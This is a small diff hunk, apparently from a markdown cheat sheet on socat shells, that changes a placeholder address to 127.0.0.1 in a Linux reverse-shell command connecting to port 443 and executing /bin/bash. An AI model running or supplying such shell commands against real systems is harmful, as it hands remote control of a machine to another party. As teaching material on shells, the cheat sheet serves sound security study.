@@ -191,7 +191,7 @@ Alice need to send Bob
 ```
 - On Linux
 ```bash
-    socat TCP4:<IP address>:443 EXEC:/bin/bash
+    socat TCP4:127.0.0.1:443 EXEC:/bin/bash
 ```
 ## Socat Encrypt Bind Shells
 _Note:- Secure Socket Layer certificates. 
